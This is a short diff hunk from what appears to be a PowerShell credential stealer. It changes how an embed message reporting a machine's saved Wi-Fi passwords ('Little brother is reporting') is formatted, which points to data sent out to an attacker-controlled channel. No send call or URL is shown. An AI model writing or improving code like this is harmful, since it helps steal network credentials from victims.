@@ -27,7 +27,7 @@ $forEmbed =  [PSCustomObject]@{
     'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
     'color'       = '16744960'
     'fields'   = @(@{
-    'name' = $loggedwifis | Format-Table | Out-String    
+    'name' = @($loggedwifis)   
     })
 }
 
